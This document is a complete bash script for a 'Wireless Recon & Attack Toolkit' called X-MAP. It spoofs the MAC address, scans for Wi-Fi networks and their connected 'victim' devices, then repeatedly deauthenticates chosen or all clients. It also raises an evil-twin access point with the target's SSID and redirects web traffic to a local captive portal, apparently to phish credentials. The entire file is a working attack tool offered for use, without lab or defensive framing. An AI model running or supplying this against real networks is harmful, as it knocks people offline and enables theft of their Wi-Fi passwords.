#!/bin/bash

# ==========================================
#   X-MAP (Cinematic Terminal Edition - Secure)
# ==========================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

clear

# 1. X-MAP ASCII Logo (Gradient-ish Color)
echo -e "\e[38;5;51m"
cat << "EOF"
 ██╗  ██╗       ███╗   ███╗ █████╗ ██████╗ 
 ╚██╗██╔╝       ████╗ ████║██╔══██╗██╔══██╗
  ╚███╔╝ █████╗ ██╔████╔██║███████║██████╔╝
  ██╔██╗ ╚════╝ ██║╚██╔╝██║██╔══██║██╔═══╝ 
 ██╔╝ ██╗       ██║ ╚═╝ ██║██║  ██║██║     
 ╚═╝  ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
EOF
echo -e "\e[38;5;129m"
echo "  ==============================================="
echo -e "${PURPLE}   [ Wireless Recon & Attack Toolkit | v2.2 ]${NC}"
echo -e "\e[38;5;129m"
echo "  ==============================================="
echo -e "${NC}"
echo ""

if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Please run as root (sudo ./phantom.sh)${NC}"
  exit
fi

# 1. Cleanup
echo -e "${YELLOW}[*] Cleaning up interfaces...${NC}"
sudo killall hostapd dnsmasq aireplay-ng airodump-ng 2>/dev/null
sudo iptables -t nat -F 2>/dev/null
sudo ip link set wlan1 down 2>/dev/null
sleep 2

# 2. Light Ghost Mode (MAC Spoof & Firewall)
echo -e "${YELLOW}[*] Activating Secure Mode (Ghost Mode)...${NC}"
# MAC Randomization with a 3-second wait for driver stabilization
sudo macchanger -r wlan1 > /dev/null 2>&1
sleep 3

# Block external Pings & Port 80, but allow internal Fake AP traffic
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
sudo iptables -A INPUT -p tcp --dport 80 -i wlan1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
sudo iptables -A INPUT -p tcp --dport 443 -i wlan1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j DROP
echo -e "${GREEN}[+] Stealth Mode Activated. You are now invisible.${NC}"
sleep 2

# MAIN MENU LOOP
while true; do
    # 3. Select Band (2.4G or 5G)
    echo ""
    echo -e "${CYAN}[?] Select Scan Band:${NC}"
    echo -e "    ${YELLOW}[1]${NC} 2.4 GHz (Channels 1-14)"
    echo -e "    ${YELLOW}[2]${NC} 5 GHz (Channels 36-165)"
    echo -e "    ${YELLOW}[3]${NC} Both (2.4 GHz + 5 GHz)"
    read -p "Enter choice (1, 2 or 3): " BAND_CHOICE

    if [ "$BAND_CHOICE" == "1" ]; then
        SCAN_BAND="bg"
        echo -e "${CYAN}[*] Scanning 2.4 GHz band (20 seconds)...${NC}"
    elif [ "$BAND_CHOICE" == "2" ]; then
        SCAN_BAND="a"
        echo -e "${CYAN}[*] Scanning 5 GHz band (20 seconds)...${NC}"
    else
        SCAN_BAND="abg"
        echo -e "${CYAN}[*] Scanning 2.4 GHz + 5 GHz band (20 seconds)...${NC}"
    fi

    sudo iw reg set BD
    sudo ip link set wlan1 down
    sudo iw dev wlan1 set type monitor
    sudo ip link set wlan1 up
    sleep 2

    sudo rm -f /tmp/scan-01.csv /tmp/victims-01.csv
    
    # Background scan
    sudo airodump-ng --band $SCAN_BAND wlan1 -w /tmp/scan --output-format csv > /dev/null 2>&1 &
    AIRO_PID=$!
    sleep 20
    sudo kill -SIGINT $AIRO_PID 2>/dev/null
    sudo pkill -f "airodump-ng" 2>/dev/null
    sleep 2
    sudo ip link set wlan1 down
    sleep 1

    # Parse Scan Results
    IFS=$'\n'
    INDEX=1
    declare -a BSSID_ARR
    declare -a CH_ARR
    declare -a ESSID_ARR

    # Styled Table Header
    echo ""
    echo -e "${CYAN}  ┌────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}  │${PURPLE}                  DETECTED WIFI TARGETS                   ${CYAN}│${NC}"
    echo -e "${CYAN}  ├─────┬────────────────────────┬─────┬────────┬───────────────┤${NC}"
    echo -e "${CYAN}  │${YELLOW} No  │ BSSID                  │ CH  │ SIGNAL │ ESSID         ${CYAN}│${NC}"
    echo -e "${CYAN}  ├─────┼────────────────────────┼─────┼────────┼───────────────┤${NC}"

    if [ -f /tmp/scan-01.csv ]; then
        while IFS=',' read -r bssid f1 f2 ch f3 f4 f5 f6 pwr f7 f8 f9 f10 essid rest; do
            if [[ "$bssid" =~ ^[0-9A-Fa-f]{2}: ]]; then
                essid=$(echo "$essid" | tr -d ' ')
                if [ -n "$essid" ] && [ "$essid" != "<length:" ] && [ ${#essid} -gt 1 ]; then
                    BSSID_ARR[$INDEX]="$bssid"
                    CH_ARR[$INDEX]="$ch"
                    ESSID_ARR[$INDEX]="$essid"
                    clean_ch=$(echo "$ch" | xargs)
                    clean_pwr=$(echo "$pwr" | xargs)
                    
                    # Signal Bar Logic
                    if [ "$clean_pwr" -gt -50 ] 2>/dev/null; then SIG="${GREEN}▂▄▆█${NC}"; 
                    elif [ "$clean_pwr" -gt -70 ] 2>/dev/null; then SIG="${CYAN}▂▄▆_${NC}";
                    else SIG="${RED}▂___${NC}"; fi
                    
                    # Print Row
                    printf "  ${CYAN}│${NC} ${YELLOW}[%-2s]${NC} ${CYAN}│${NC} %-20s ${CYAN}│${NC} %-3s ${CYAN}│${NC} %-14b ${CYAN}│${NC} %-13s ${CYAN}│${NC}\n" "$INDEX" "$bssid" "$clean_ch" "$SIG" "$essid"
                    INDEX=$((INDEX+1))
                fi
            fi
        done < <(grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' /tmp/scan-01.csv)
    else
        echo -e "${CYAN}  │${RED}      Failed to capture network scan file.                 ${CYAN}│${NC}"
    fi
    
    echo -e "${CYAN}  └─────┴────────────────────────┴─────┴────────┴───────────────┘${NC}"
    echo ""

    if [ $INDEX -eq 1 ]; then
        echo -e "${RED}[!] No targets found. Retrying...${NC}"
        sleep 2
        continue
    fi

    # 4. Select Target Network
    while true; do
        echo ""
        read -p "$(echo -e ${CYAN}"[?] Select target network number (or 'back' to rescan): "${NC})" TARGET_INPUT
        
        if [ "$TARGET_INPUT" == "back" ]; then
            echo -e "${YELLOW}[*] Going back to network scan...${NC}"
            break
        fi
        
        if [ -n "${BSSID_ARR[$TARGET_INPUT]}" ]; then
            TARGET_NUM=$TARGET_INPUT
            break
        else
            echo -e "${RED}[!] Invalid selection. Try again.${NC}"
        fi
    done

    if [ "$TARGET_INPUT" == "back" ]; then
        continue
    fi

    T_BSSID="${BSSID_ARR[$TARGET_NUM]}"
    T_CH=$(echo "${CH_ARR[$TARGET_NUM]}" | xargs)
    T_ESSID="${ESSID_ARR[$TARGET_NUM]}"

    echo -e "${GREEN}[+] Target Locked: $T_ESSID ($T_BSSID) on Channel $T_CH${NC}"

    # 5. Scan Victims on Target Channel
    echo -e "${CYAN}[*] Sniffing connected devices on $T_ESSID (20 seconds)...${NC}"
    sudo ip link set wlan1 down
    sudo iw dev wlan1 set type monitor
    sudo iw dev wlan1 set channel $T_CH
    sudo ip link set wlan1 up
    sleep 2

    sudo rm -f /tmp/victims-01.csv
    
    sudo airodump-ng wlan1 --bssid $T_BSSID -c $T_CH -w /tmp/victims --output-format csv > /dev/null 2>&1 &
    VIC_PID=$!
    sleep 20
    sudo kill -SIGINT $VIC_PID 2>/dev/null
    sudo pkill -f "airodump-ng" 2>/dev/null
    sleep 2
    sudo ip link set wlan1 down
    sleep 1

    # Parse Victim Results
    V_INDEX=1
    declare -a V_MAC_ARR
    declare -a V_PWR_ARR

    echo ""
    echo -e "${CYAN}  ┌────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}  │${PURPLE}                CONNECTED VICTIM DEVICES                  ${CYAN}│${NC}"
    echo -e "${CYAN}  ├─────┬────────────────────────┬────────────┬───────────────┤${NC}"
    echo -e "${CYAN}  │${YELLOW} No  │ MAC ADDRESS            │ SIGNAL PWR │ FRAMES        ${CYAN}│${NC}"
    echo -e "${CYAN}  ├─────┼────────────────────────┼────────────┼───────────────┤${NC}"

    if [ -f /tmp/victims-01.csv ]; then
        while IFS=',' read -r mac f1 pwr f2 frames rest; do
            mac=$(echo "$mac" | tr -d ' ')
            if [[ "$mac" =~ ^[0-9A-Fa-f]{2}: ]] && [ "$mac" != "Station" ] && [ -n "$mac" ]; then
                V_MAC_ARR[$V_INDEX]="$mac"
                V_PWR_ARR[$V_INDEX]="$pwr"
                clean_pwr=$(echo "$pwr" | xargs)
                clean_frames=$(echo "$frames" | xargs)
                
                printf "  ${CYAN}│${NC} ${YELLOW}[%-2s]${NC} ${CYAN}│${NC} %-20s ${CYAN}│${NC} %-10s ${CYAN}│${NC} %-13s ${CYAN}│${NC}\n" "$V_INDEX" "$mac" "$clean_pwr" "$clean_frames"
                V_INDEX=$((V_INDEX+1))
            fi
        done < <(sed -n '/Station MAC/,$p' /tmp/victims-01.csv | tail -n +2)
    else
        echo -e "${CYAN}  │${RED}      Failed to capture victim scan file.                 ${CYAN}│${NC}"
    fi
    
    echo -e "${CYAN}  └─────┴────────────────────────┴────────────┴───────────────┘${NC}"

    if [ $V_INDEX -eq 1 ]; then
        echo -e "${RED}[!] No connected devices found or they are hidden.${NC}"
    fi

    # 6. Victim Selection
    while true; do
        echo ""
        echo -e "${CYAN}[?] Select Attack Strategy:${NC}"
        echo -e "    ${YELLOW}[1]${NC} Attack specific devices (e.g., 1 3)"
        echo -e "    ${YELLOW}[2]${NC} Attack ALL connected devices (Broadcast)"
        read -p "Enter choice (1 or 2) (or type 'back' to choose another network): " V_MODE

        if [ "$V_MODE" == "back" ]; then
            echo -e "${YELLOW}[*] Going back to network selection...${NC}"
            break
        fi

        if [ "$V_MODE" == "1" ]; then
            read -p "Enter device numbers (space separated) (or 'back'): " SELECTED_DEVICES
            if [ "$SELECTED_DEVICES" == "back" ]; then
                echo -e "${YELLOW}[*] Returning to attack strategy menu...${NC}"
                continue
            fi
            DEAUTH_TARGETS=""
            for num in $SELECTED_DEVICES; do
                if [ -n "${V_MAC_ARR[$num]}" ]; then
                    DEAUTH_TARGETS="$DEAUTH_TARGETS -c ${V_MAC_ARR[$num]}"
                fi
            done
            echo -e "${GREEN}[+] Targeting devices: $SELECTED_DEVICES${NC}"
            break
        elif [ "$V_MODE" == "2" ]; then
            echo -e "${GREEN}[+] Targeting ALL devices on network${NC}"
            break
        else
            echo -e "${RED}[!] Invalid choice. Try again.${NC}"
        fi
    done

    if [ "$V_MODE" != "back" ] && { [ "$V_MODE" == "1" ] || [ "$V_MODE" == "2" ]; }; then
        break
    fi
done

# 7. Auto Setup Configs
echo -e "${YELLOW}[*] Configuring Fake AP & Portal...${NC}"

if [ "$T_CH" -gt 14 ]; then
    HW_MODE="a" # 5GHz
else
    HW_MODE="g" # 2.4GHz
fi

cat << EOF > /etc/hostapd/hostapd.conf
interface=wlan1
driver=nl80211
ssid=$T_ESSID
hw_mode=$HW_MODE
channel=$T_CH
ieee80211n=1
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
EOF

echo "$T_ESSID" > /var/www/html/current_router.txt
chown www-data:www-data /var/www/html/current_router.txt

sed -i 's/^interface=.*/interface=wlan1/' /etc/dnsmasq.conf
iptables -t nat -F
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80
systemctl restart apache2

# 8. Start Attack Loop
echo ""
echo -e "${CYAN}  ┌────────────────────────────────────────────────────────┐${NC}"
echo -e "${CYAN}  │${RED}                 LAUNCHING SEQUENTIAL ATTACK              ${CYAN}│${NC}"
echo -e "${CYAN}  │${PURPLE}                Press Ctrl+C to stop the attack            ${CYAN}│${NC}"
echo -e "${CYAN}  └────────────────────────────────────────────────────────┘${NC}"
sleep 2

while true; do
    echo -e "${RED}[*] Phase 1: DEAUTH...${NC}"
    ip link set wlan1 down
    iw dev wlan1 set type monitor
    iw dev wlan1 set channel $T_CH
    ip link set wlan1 up
    sleep 2
    
    if [ "$V_MODE" == "1" ]; then
        timeout 20 aireplay-ng --deauth 0 -a $T_BSSID $DEAUTH_TARGETS wlan1
    else
        timeout 20 aireplay-ng --deauth 0 -a $T_BSSID wlan1
    fi
    
    echo -e "${GREEN}[*] Phase 2: FAKE AP ACTIVE...${NC}"
    ip link set wlan1 down
    iw dev wlan1 set type __ap
    ip addr flush dev wlan1
    ip addr add 10.0.0.1/24 dev wlan1
    ip link set wlan1 up
    sleep 2
    
    timeout 20 hostapd /etc/hostapd/hostapd.conf &
    timeout 20 dnsmasq -C /etc/dnsmasq.conf -d &
    sleep 20
    killall hostapd dnsmasq 2>/dev/null
done
